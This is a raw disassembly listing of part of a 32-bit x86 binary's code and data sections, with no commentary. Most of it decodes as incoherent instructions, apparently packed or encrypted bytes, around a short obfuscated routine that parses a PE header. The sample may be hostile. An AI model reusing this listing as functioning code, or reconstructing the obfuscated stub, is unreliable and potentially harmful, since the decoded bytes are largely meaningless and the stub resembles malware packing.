  41140e:	test   al,0x3e
  411410:	pop    es
  411411:	shr    DWORD PTR [ebx-0x7a],1
  411414:	rcl    ecx,0x7b
  411417:	add    BYTE PTR [esi],cl
  411419:	outs   dx,DWORD PTR ds:[esi]
  41141a:	dec    esi
  41141b:	aaa    
  41141c:	and    BYTE PTR [esp+edi*8+0x2f],ch
  411420:	xor    eax,0xb6ee30b7
  411425:	les    ecx,FWORD PTR [ebx+0x72]
  411428:	cmp    al,0xd6
  41142a:	rcl    DWORD PTR [ecx+0x17],cl
  41142d:	sahf   
  41142e:	add    bl,ch
  411430:	mov    cl,0x3d
  411432:	cdq    
  411433:	(bad)  
  411434:	mov    ebp,0x4620bc14
  411439:	inc    edx
  41143a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41143b:	leave  
  41143c:	pop    edi
  41143d:	jno    0x41143b
  41143f:	aam    0x6
  411441:	sbb    ebp,ecx
  411443:	mov    edi,0x4422e276
  411448:	js     0x4113ea
  41144a:	loop   0x411414
  41144c:	ret    0xebc4
  41144f:	mov    esp,0x6ada6485
  411454:	or     ebp,0xe48df017
  41145a:	in     al,dx
  41145b:	mov    ecx,DWORD PTR [ebp+0x4e34b34e]
  411461:	xor    DWORD PTR [eax+0x3eb8dc50],esi
  411467:	loopne 0x411447
  411469:	adc    dl,BYTE PTR [edx+0x7e]
  41146c:	inc    dl
  41146e:	or     al,0x3f
  411470:	sub    DWORD PTR [esi+0x657dd14c],ebp
  411476:	std    
  411477:	jb     0x4114ab
  411479:	jne    0x4114ae
  41147b:	ss xchg esi,eax
  41147d:	xchg   ecx,eax
  41147e:	data16 mov bh,BYTE PTR [esp+eiz*2]
  411482:	sbb    ebx,DWORD PTR [ecx-0x66e69ec]
  411488:	jmp    0xbe51d283
  41148d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41148e:	in     al,dx
  41148f:	daa    
  411490:	test   al,0xa6
  411492:	outs   dx,BYTE PTR ds:[esi]
  411493:	sub    BYTE PTR [edi+0x71fcc45f],ah
  411499:	pop    es
  41149a:	(bad)  
  41149c:	add    bh,BYTE PTR [ebp-0x5a5eac3f]
  4114a2:	(bad)  [ecx+0x2c]
  4114a5:	aas    
  4114a6:	mov    WORD PTR [eax],es
  4114a8:	push   eax
  4114a9:	xchg   esp,eax
  4114aa:	xchg   ebx,eax
  4114ab:	xor    DWORD PTR [ebx+ecx*8],0x3f5f7346
  4114b2:	retf   0xb3a6
  4114b5:	mov    ebp,0x3c96f516
  4114ba:	into   
  4114bb:	test   al,0xf8
  4114bd:	(bad)  
  4114be:	dec    ebx
  4114bf:	(bad)  
  4114c0:	add    al,dh
  4114c2:	daa    
  4114c3:	lods   al,BYTE PTR ds:[esi]
  4114c4:	add    eax,edx
  4114c6:	rol    BYTE PTR [esi],1
  4114c8:	stc    
  4114c9:	cmp    DWORD PTR [edx+0x5e],edi
  4114cc:	int    0x5c
  4114ce:	sub    BYTE PTR [edi],dh
  4114d0:	inc    esi
  4114d1:	(bad)  [edx+0x2fff432a]
  4114d7:	test   DWORD PTR [ecx],ecx
  4114d9:	ja     0x4114da
  4114db:	dec    edx
  4114dc:	sub    bl,BYTE PTR [eax-0x59bb498c]
  4114e2:	in     al,0x9b
  4114e4:	fdiv   DWORD PTR [ebp+0x0]
  4114e7:	pop    eax
  4114e8:	xchg   edi,eax
  4114e9:	inc    bl
  4114eb:	push   esi
  4114ec:	sar    esp,0x2b
  4114ef:	pop    esi
  4114f0:	sbb    DWORD PTR [ebx],eax
  4114f2:	(bad)  
  4114f3:	jl     0x41155a
  4114f5:	and    eax,ebp
  4114f7:	cmp    eax,0x77bde913
  4114fc:	lods   eax,DWORD PTR ds:[esi]
  4114fd:	enter  0xf2c4,0x2b
  411501:	fdivr  st(5),st
  411503:	jmp    0x41155c
  411505:	adc    bh,BYTE PTR [esp+ecx*8+0x5a]
  411509:	jl     0x411558
  41150b:	pusha  
  41150c:	shl    DWORD PTR [eax+0x3e],1
  41150f:	pop    ecx
  411510:	jbe    0x4114f6
  411512:	inc    eax
  411513:	ds mov cl,0xfb
  411516:	pushf  
  411517:	push   edi
  411518:	xor    DWORD PTR [edi],0xfffffff5
  41151b:	loopne 0x4114e7
  41151d:	dec    ebx
  41151e:	in     eax,dx
  41151f:	leave  
  411520:	mov    edx,0xb8ea5f98
  411525:	jg     0x41154b
  411527:	mov    dl,BYTE PTR [ebx+ebx*4-0x1d]
  41152b:	mov    ds:0x21607d5e,al
  411530:	stos   BYTE PTR es:[edi],al
  411531:	int    0x38
  411533:	xor    eax,0x483322bc
  411538:	pusha  
  411539:	jmp    0xcb2f604e
  41153e:	loope  0x4115a3
  411540:	ss loopne 0x4114dc
  411543:	cld    
  411544:	sbb    al,0xc5
  411546:	jecxz  0x411552
  411548:	pushf  
  411549:	pop    esp
  41154a:	daa    
  41154b:	lea    ecx,[ecx+0x2b4a618e]
  411551:	(bad)
  411556:	xchg   esp,eax
  411557:	shl    BYTE PTR [eax],0x36
  41155a:	jge    0x41151a
  41155c:	dec    edx
  41155d:	jmp    0x41156f
  41155f:	cmp    edi,edx
  411561:	push   ss
  411562:	lea    esp,[esi+0xc53e6ae]
  411568:	mov    cl,0x53
  41156a:	test   eax,0x57d40b4c
  41156f:	inc    edi
  411570:	jmp    0xd78f7442
  411575:	icebp  
  411576:	inc    esi
  411577:	add    eax,0xcbdce61f
  41157c:	cld    
  41157d:	sub    esi,DWORD PTR [ebx]
  41157f:	inc    ebp
  411580:	pop    esp
  411581:	add    DWORD PTR [ecx],esi
  411583:	cmc    
  411584:	test   al,0xde
  411586:	mov    edx,DWORD PTR [ebx]
  411588:	leave  
  411589:	adc    al,0x8d
  41158b:	xor    cl,BYTE PTR [eax]
  41158d:	pop    ss
  41158e:	sub    DWORD PTR ds:0x68a0675d,ebx
  411594:	adc    eax,ecx
  411596:	mov    bl,0xd8
  411598:	in     al,dx
  411599:	pop    ss
  41159a:	push   ds
  41159b:	ss xchg ebp,eax
  41159d:	fbld   TBYTE PTR [ebx+ebx*2]
  4115a0:	ret    
  4115a1:	pop    edi
  4115a2:	sbb    BYTE PTR [ecx-0x24],0x8c
  4115a6:	inc    ecx
  4115a7:	gs dec eax
  4115a9:	adc    ecx,ebp
  4115ab:	or     edx,edx
  4115ad:	loopne 0x411604
  4115af:	xchg   ebp,eax
  4115b0:	dec    esi
  4115b1:	out    0x0,al
  4115b3:	or     DWORD PTR [eax-0x4da4252d],ecx
  4115b9:	add    bh,BYTE PTR [esi+ebp*1+0x4fec11e5]
  4115c0:	add    DWORD PTR [ebx],ebx
  4115c2:	mov    ecx,0x65741194
  4115c7:	and    eax,DWORD PTR [ebp+0x73fc56c1]
  4115cd:	jno    0x4115d7
  4115cf:	push   eax
  4115d0:	mov    ds:0x8b5bea49,eax
  4115d5:	push   ebp
  4115d6:	or     BYTE PTR [ebx],dh
  4115d8:	ror    DWORD PTR [ebp+0x729b1084],0x32
  4115df:	add    BYTE PTR [ecx+0x45ff0845],cl
  4115e5:	or     al,0xe9
  4115e7:	sti    
  4115e8:	stc    
  4115e9:	(bad)  
  4115ea:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	sub    DWORD PTR [ebx],eax
  41161a:	aam    0xf8
  41161c:	xchg   BYTE PTR [eax+0x7e],al
  41161f:	jle    0x4115c5
  411621:	jg     0x4116a1
  411623:	jle    0x41169a
  411625:	jg     0x411665
  411627:	sub    BYTE PTR [eax-0x6dcff0ec],dl
  41162d:	scas   eax,DWORD PTR es:[edi]
  41162e:	repnz inc ebp
  411630:	imul   edi,DWORD PTR [ebp+ebp*8-0x80],0x8
  411635:	in     al,dx
  411636:	jnp    0x4116ab
  411638:	mov    cl,0x3f
  41163a:	ja     0x411656
  41163c:	bound  ebx,QWORD PTR [ebx+0xd]
  41163f:	lds    eax,FWORD PTR [ebx]
  411641:	ret    
  411642:	outs   dx,DWORD PTR ds:[esi]
  411643:	inc    edx
  411644:	push   edi
  411645:	pop    esp
  411646:	adc    DWORD PTR [esi-0xdfc14d9],0xf8275edb
  411650:	xor    eax,0xc754a88d
  411655:	test   DWORD PTR [esi-0x3b86293d],esp
  41165b:	sub    BYTE PTR [eax],0x61
  41165e:	stos   BYTE PTR es:[edi],al
  41165f:	jno    0x4116dc
  411661:	das    
  411662:	ret    
  411663:	jo     0x4116d4
  411665:	scas   al,BYTE PTR es:[edi]
  411666:	or     bh,0xc6
  411669:	dec    esp
  41166a:	addr16 cld 
  41166c:	cld    
  41166d:	sub    BYTE PTR [esi-0x747ee3b4],dh
  411673:	mov    esi,0xe56b6640
  411678:	enter  0xb2ab,0xe9
  41167c:	xlat   BYTE PTR ds:[ebx]
  41167d:	retf   0x2e0f
  411680:	jmp    0x3cf8:0x59ca4349
  411687:	fcmovnbe st,st(4)
  411689:	fdivr  DWORD PTR [edi]
  41168b:	call   0x4d0a:0x2237bf6f
  411692:	jno    0x411653
  411694:	call   0x292fd893
  411699:	loopne 0x4116ab
  41169b:	mov    ebp,0xd3aa0c6c
  4116a0:	dec    esi
  4116a1:	jecxz  0x41168f
  4116a3:	xor    BYTE PTR [ecx+0x70],bh
  4116a6:	std    
  4116a7:	out    dx,eax
  4116a8:	imul   ebx,DWORD PTR [edx-0x75],0x97858867
  4116af:	in     al,dx
  4116b0:	aad    0xca
  4116b2:	cmp    eax,DWORD PTR [eax+ecx*8+0x3a3aec87]
  4116b9:	ins    BYTE PTR es:[edi],dx
  4116ba:	adc    DWORD PTR [eax+0x32],edx
  4116bd:	out    dx,al
  4116be:	dec    edi
  4116bf:	test   eax,ebp
  4116c1:	nop
  4116c2:	and    dh,dh
  4116c4:	fcmove st,st(5)
  4116c6:	adc    bh,BYTE PTR [edi+0x69]
  4116c9:	inc    esi
  4116ca:	inc    edi
  4116cb:	push   edx
  4116cc:	pop    ebx
  4116cd:	out    dx,eax
  4116ce:	int    0x67
  4116d0:	dec    eax
  4116d1:	xchg   esp,eax
  4116d2:	sti    
  4116d3:	out    dx,eax
  4116d4:	lock add BYTE PTR [ebp-0x59],0x29
  4116d9:	aad    0x86
  4116db:	ret    
  4116dc:	push   ds
  4116dd:	mov    esi,DWORD PTR ds:0x5d260aee
  4116e3:	jae    0x41175c
  4116e5:	scas   eax,DWORD PTR es:[edi]
  4116e6:	ins    BYTE PTR es:[edi],dx
  4116e7:	pop    esi
  4116e8:	and    eax,0xffbee0bf
  4116ed:	jecxz  0x411704
  4116ef:	aad    0x8
  4116f1:	gs or  esi,ecx
  4116f4:	rcr    DWORD PTR [ecx],0x59
  4116f7:	push   ss
  4116f8:	out    dx,al
  4116f9:	mov    eax,0xdbbad14c
  4116fe:	retf   
  4116ff:	dec    ecx
  411700:	pop    ds
  411701:	test   BYTE PTR [edx+0x1e],ah
  411704:	lea    ecx,[ebx]
  411706:	push   es
  411707:	ins    BYTE PTR es:[edi],dx
  411708:	in     eax,dx
  411709:	push   ecx
  41170a:	cmp    eax,0x7ec00c32
  41170f:	mov    al,0x57
  411711:	pop    ss
  411712:	out    0xcf,al
  411714:	inc    ebp
  411715:	aad    0x86
  411717:	mov    edi,0x3952fa58
  41171c:	mov    ch,0x17
  41171e:	add    DWORD PTR [edi+0x17c6a51d],edx
  411724:	jmp    0xcd03:0xd91b7f62
  41172b:	fdiv   QWORD PTR ds:0xf76f
  411730:	pusha  
  411731:	fnstenv [edi]
  411733:	cli    
  411734:	ja     0x411780
  411736:	fistp  DWORD PTR [edx-0x6386b2d]
  41173c:	retf   
  41173d:	add    eax,0xa25c8e76
  411742:	fisubr WORD PTR [edi+eiz*4-0x29cb3e4b]
  411749:	adc    al,0x17
  41174b:	fimul  WORD PTR [esi]
  41174d:	jl     0x4117c8
  41174f:	push   edx
  411750:	clc    
  411751:	mov    al,0xad
  411753:	sub    BYTE PTR [ecx+0x54],0xa3
  411757:	retf   
  411758:	pop    edi
  411759:	xor    edi,ecx
  41175b:	popf   
  41175c:	mov    dl,0xa1
  41175e:	popa   
  41175f:	fsubr  DWORD PTR [edx]
  411761:	adc    ch,al
  411763:	loopne 0x4117b2
  411765:	(bad)  
  411766:	shr    esi,0x48
  411769:	push   ss
  41176a:	je     0x4116ee
  41176c:	add    al,0xc
  41176e:	gs jmp 0x75ec:0x69fba158
  411776:	daa    
  411777:	and    DWORD PTR [edx+eiz*2-0x61b424b6],edx
  41177e:	sub    BYTE PTR [edi+ebx*4-0x71ba000d],0x1c
  411786:	fmul   QWORD PTR [edx]
  411788:	outs   dx,BYTE PTR ds:[esi]
  411789:	shl    BYTE PTR [ecx+0x12],0xfa
  41178d:	dec    ecx
  41178e:	loop   0x41176f
  411790:	xchg   DWORD PTR [edx],ebx
  411792:	mov    eax,0x9b59e97
  411797:	xchg   ebx,eax
  411798:	call   0xb057:0x6c2d107b
  41179f:	fiadd  DWORD PTR [esi+eiz*8+0x15]
  4117a3:	loope  0x41175e
  4117a5:	mov    esi,0x550ec638
  4117aa:	inc    esp
  4117ab:	or     ecx,DWORD PTR [esi]
  4117ad:	dec    eax
  4117ae:	aad    0xeb
  4117b0:	mov    edx,0x8ab09f04
  4117b5:	xor    DWORD PTR [ebp-0x4c1d67ff],ecx
  4117bb:	(bad)  
  4117bc:	popf   
  4117bd:	mov    bl,0x6f
  4117bf:	jb     0x41182d
  4117c1:	add    BYTE PTR [edx*1-0x1b0da3c1],0x6f
  4117c9:	xchg   BYTE PTR [esi+0x1c],ah
  4117cc:	test   DWORD PTR [eax],esp
  4117ce:	mov    eax,DWORD PTR [ebp+0x8]
  4117d1:	mov    DWORD PTR ds:0x433823,0x423d
  4117db:	mov    al,BYTE PTR [eax]
  4117dd:	sub    DWORD PTR ds:0x43377f,0x6d7d
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43381f,0x433783
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43381f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43379b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x43382b,0x0
  41182f:	mov    eax,ds:0x43382b
  411834:	inc    eax
  411835:	mov    ds:0x43382b,eax
  41183a:	cmp    DWORD PTR ds:0x43382b,0xb
  411841:	jne    0x411887
  411847:	push   0x43393c
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x43382b,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x43382b
  411899:	inc    eax
  41189a:	mov    ds:0x43382b,eax
  41189f:	cmp    DWORD PTR ds:0x43382b,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	or     eax,0x2c8fa1a9
  4118ec:	dec    esi
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x411907
  4118f4:	push   edi
  4118f5:	fs pop es
  4118f7:	addr16 push esp
  4118f9:	fnstenv [esp+esi*1+0x73]
  4118fd:	jmp    0xbe150061
  411902:	test   al,0xfb
  411904:	jp     0x4118bf
  411906:	mov    ah,0x2
  411908:	sub    eax,0x4b128dc4
  41190d:	mov    al,ds:0x4800f39c
  411912:	aas    
  411913:	add    al,0x95
  411915:	aad    0x18
  411917:	xor    dl,bl
  411919:	fs je  0x4118c5
  41191c:	xlat   BYTE PTR ds:[ebx]
  41191d:	psubusb mm5,mm6
  411920:	mov    ah,0x4
  411922:	rcl    DWORD PTR [edi+0x67fb29f8],0x3e
  411929:	repz jge 0x41194b
  41192c:	xchg   edi,eax
  41192d:	cmp    BYTE PTR [ebp+0x6eaea563],dl
  411933:	push   ebp
  411934:	inc    ebx
  411935:	fadd   QWORD PTR [eax+0x30ee26d0]
  41193b:	push   fs
  41193d:	jmp    0x411933
  41193f:	imul   eax,DWORD PTR [esi],0x56e4400c
  411945:	pusha  
  411946:	stc    
  411947:	ret    
  411948:	pop    esi
  411949:	out    0xda,eax
  41194b:	lods   al,BYTE PTR ds:[esi]
  41194c:	out    0x50,eax
  41194e:	jae    0x41190c
  411950:	sahf   
  411951:	pop    edi
  411952:	xchg   edx,eax
  411953:	das    
  411954:	sbb    dl,BYTE PTR [ebx]
  411956:	fidiv  WORD PTR [ebx]
  411958:	inc    edx
  411959:	sub    cl,bh
  41195b:	or     al,0x4
  41195d:	sbb    BYTE PTR [eax],0x6
  411960:	fsubr  DWORD PTR [esi]
  411962:	and    DWORD PTR [edi],edi
  411964:	and    DWORD PTR [ebp-0x2c],ebx
  411967:	shl    BYTE PTR [edx-0x1d5343fb],1
  41196d:	xchg   ecx,eax
  41196e:	pop    DWORD PTR [ecx+ebp*8+0x56]
  411972:	div    ecx
  411974:	xor    ecx,edi
  411976:	into   
  411977:	push   ds
  411978:	mov    ecx,0x3d0e58fc
  41197d:	rol    DWORD PTR [edi-0x46397ebe],0x71
  411984:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  411986:	pop    esi
  411987:	inc    esp
  411988:	pop    ds
  411989:	(bad)
  41198c:	and    ah,BYTE PTR [ebx+0x112de211]
  411992:	or     DWORD PTR [edx-0x146a71d1],esi
  411998:	or     BYTE PTR [edx],cl
  41199a:	add    DWORD PTR [ebx+0x61ce12a1],ebp
  4119a0:	mov    edx,0x57bcd973
  4119a5:	mov    ebp,0xaa422af9
  4119aa:	dec    eax
  4119ab:	mov    esi,0xe73923ef
  4119b0:	mul    BYTE PTR [ebx+0x45]
  4119b3:	fild   WORD PTR [esi-0x67164151]
  4119b9:	adc    al,0xe1
  4119bb:	cwde   
  4119bc:	and    BYTE PTR [ebx-0x2468b298],bh
  4119c2:	(bad)  
  4119c4:	pop    ecx
  4119c5:	jno    0x4119ee
  4119c7:	(bad)  
  4119c8:	adc    al,cl
  4119ca:	mov    al,0xd0
  4119cc:	inc    edx
  4119cd:	mov    DWORD PTR es:[esi],ecx
  4119d0:	xor    ah,dl
  4119d2:	or     BYTE PTR [edi+0x78332645],ch
  4119d8:	ret    
  4119d9:	jmp    0x885ac782
  4119de:	xor    DWORD PTR [eax-0x644e7606],ebp
  4119e4:	lahf   
  4119e5:	xor    al,0xb7
  4119e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119e8:	in     eax,dx
  4119e9:	xchg   edx,eax
  4119ea:	lods   al,BYTE PTR ds:[esi]
  4119eb:	ins    DWORD PTR es:[edi],dx
  4119ec:	int3   
  4119ed:	(bad)  
  4119ee:	leave  
  4119ef:	nop
  4119f0:	xchg   ebp,eax
  4119f1:	or     eax,DWORD PTR [esp+esi*4]
  4119f4:	or     ax,0xc1df
  4119f8:	jns    0x411a20
  4119fa:	icebp  
  4119fb:	jnp    0x411a55
  4119fd:	sahf   
  4119fe:	sub    ecx,DWORD PTR [ebx]
  411a00:	adc    ebp,esp
  411a02:	push   es
  411a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a04:	popf   
  411a05:	dec    esi
  411a06:	jno    0x41198d
  411a08:	and    BYTE PTR [eax-0x7c],dl
  411a0b:	xchg   bl,cl
  411a0d:	mov    bh,0x93
  411a0f:	fs stos BYTE PTR es:[edi],al
  411a11:	cmp    esi,DWORD PTR ds:0xf6f11e00
  411a17:	jmp    0x798d:0x1772a5f9
  411a1e:	push   es
  411a1f:	loop   0x411a57
  411a21:	scas   eax,DWORD PTR es:[edi]
  411a22:	and    al,0xdd
  411a24:	lea    eax,[ebp+0x6d]
  411a27:	(bad)  
  411a28:	and    al,0x5e
  411a2a:	scas   al,BYTE PTR es:[edi]
  411a2b:	xchg   edi,eax
  411a2c:	in     eax,dx
  411a2d:	mov    al,ds:0x1928bcb1
  411a32:	jg     0x411a33
  411a34:	cmp    al,0x23
  411a36:	inc    edx
  411a37:	shr    DWORD PTR [ebp+0x67],1
  411a3a:	xor    BYTE PTR [eax+ebx*4],dh
  411a3d:	mov    edi,0xb396450a
  411a42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a43:	bnd ja 0x411a43
  411a46:	iret   
  411a47:	dec    ebp
  411a48:	int3   
  411a49:	push   ebp
  411a4a:	pop    edi
  411a4b:	mov    WORD PTR [eax+0x49],ds
  411a4e:	pop    esp
  411a4f:	lds    ebp,FWORD PTR [ebx]
  411a51:	aam    0x77
  411a53:	adc    DWORD PTR [edx],ecx
  411a55:	xchg   BYTE PTR [edi+0x262c4aa3],dh
  411a5b:	mov    cl,BYTE PTR [ebx+0x10]
  411a5e:	jns    0x4119ef
  411a60:	adc    ebx,esi
  411a62:	dec    ebx
  411a63:	nop
  411a64:	aad    0x8e
  411a66:	jnp    0x411aa6
  411a68:	(bad)  
  411a69:	idiv   esp
  411a6b:	inc    edx
  411a6c:	jb     0x411a27
  411a6e:	call   0x89d98260
  411a73:	jns    0x411a42
  411a75:	or     al,0x48
  411a77:	cmp    ebp,DWORD PTR [edx]
  411a79:	call   0xe1828ed7
  411a7e:	gs pop ds
  411a80:	and    ch,BYTE PTR [ecx+0x33cb3245]
  411a86:	xor    dh,cl
  411a88:	xchg   esi,eax
  411a89:	xlat   BYTE PTR ds:[ebx]
  411a8a:	ins    DWORD PTR es:[edi],dx
  411a8b:	xor    DWORD PTR [ebp+0x42],0x3d87ba69
  411a92:	fisubr DWORD PTR [ecx-0x61]
  411a95:	jo     0x411a4c
  411a97:	clc    
  411a98:	stc    
  411a99:	mov    eax,0x34f064d
  411a9e:	shr    ecx,0xd
  411aa1:	add    BYTE PTR [eax],al
  411aa3:	add    BYTE PTR [ebx+0x5435fc45],cl
  411aa9:	or     BYTE PTR [ecx+0x7],dl
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
